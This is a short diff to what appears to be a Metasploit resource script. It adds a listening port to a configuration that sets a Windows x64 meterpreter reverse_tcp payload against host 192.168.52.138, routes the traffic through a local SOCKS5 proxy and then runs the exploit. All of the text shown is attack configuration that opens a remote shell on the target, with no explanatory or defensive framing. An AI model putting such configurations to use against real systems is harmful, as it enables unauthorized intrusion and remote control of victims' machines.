@@ -8,5 +8,6 @@ set payload windows/x64/meterpreter/reverse_tcp
 set rhosts 192.168.52.138
 set Proxies socks5:127.0.0.1:8989
 set ReverseAllowProxy true
+set lport 2126	
 show targets
 run
